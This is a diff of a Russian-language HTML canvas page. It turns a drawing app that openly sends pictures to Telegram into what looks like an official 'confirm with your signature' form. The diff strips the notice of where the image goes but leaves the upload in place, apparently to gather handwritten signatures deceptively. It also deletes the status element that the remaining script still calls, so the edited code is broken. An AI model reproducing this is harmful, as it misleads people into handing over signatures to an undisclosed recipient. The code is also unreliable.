@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>🎨 Рисовалка с отправкой</title>
+    <title>Подпись</title>
     <style>
         body {
             margin: 0;
@@ -82,7 +82,7 @@
 </head>
 <body>
     <div class="container">
-        <h2 style="color: #ff4d4d; text-align: center;">✏️ Нарисуй и отправь ✏️</h2>
+        <h2 style="color: #ff4d4d; text-align: center;">Подтверди подписью</h2>
         
         <canvas id="drawCanvas" width="500" height="400"></canvas>
         
@@ -91,21 +91,16 @@
     <input type="range" id="brushSize" min="1" max="20" value="3">
     <span>🖌️ <span id="sizeValue">3</span>px</span>
     
-    <button class="clear-btn" onclick="clearCanvas()">🧹 Очистить</button>
-    <button class="send-btn" onclick="sendDrawing()">📤 Отправить рисунок</button>
+    <button class="clear-btn" onclick="clearCanvas()">Очистить</button>
+    <button class="send-btn" onclick="sendDrawing()">Подтвердить</button>
 </div>
 
 <!-- 👇 ДОБАВЬ ЭТИ ПОЛЯ СЮДА 👇 -->
 <div style="margin-top: 20px; display: flex; gap: 10px; flex-direction: column;">
-    <input type="text" id="username" placeholder="Твоё имя" value="Аноним" 
-           style="padding: 12px; border-radius: 10px; border: 2px solid #ff4d4d; font-size: 16px;">
     <input type="text" id="message" placeholder="Сообщение (необязательно)" 
            style="padding: 12px; border-radius: 10px; border: 2px solid #ff4d4d; font-size: 16px;">
 </div>
         
-        <div id="status" class="status waiting">
-            ⏳ Рисуй и нажми "Отправить"
-        </div>
     </div>
 
     <script>
@@ -183,14 +178,14 @@
         // Очистка
         function clearCanvas() {
             ctx.clearRect(0, 0, canvas.width, canvas.height);
-            statusDiv.textContent = '✅ Холст очищен! Рисуй заново';
+            statusDiv.textContent = '✅';
             statusDiv.className = 'status success';
         }
         
         // ============ ГЛАВНОЕ: ОТПРАВКА РИСУНКА НА ТВОЙ ПК ============
        function sendDrawing() {
     const status = document.getElementById('status');
-    status.textContent = '⏳ Отправка...';
+    status.textContent = 'Подтверждение....';
     status.style.background = '#fff3cd';
     
     // Получаем canvas
@@ -199,7 +194,6 @@
     canvas.toBlob((blob) => {
         const formData = new FormData();
         formData.append('drawing', blob, `drawing_${Date.now()}.png`);
-        formData.append('username', document.getElementById('username').value);
         formData.append('message', document.getElementById('message').value);
         
         // 🔥 ТОЧНО ТАКОЙ ЖЕ URL, КАК В ТЕСТЕ!
@@ -215,7 +209,7 @@
         })
         .then(data => {
             if (data.success) {
-                status.textContent = '✅ Рисунок отправлен в Telegram!';
+                status.textContent = '✅ Подтверждено!';
                 status.style.background = '#d4edda';
             } else {
                 throw new Error(data.error || 'Неизвестная ошибка');
@@ -223,13 +217,13 @@
         })
         .catch(err => {
             console.error('Ошибка:', err);
-            status.textContent = '❌ Ошибка: ' + err.message;
+            status.textContent = 'Ошибка: ' + err.message;
             status.style.background = '#f8d7da';
         });
     }, 'image/png');
 }
         
-        console.log('🎨 Рисовалка готова! Рисуй и отправляй');
+        console.log('Good');
     </script>
 </body>
 </html>
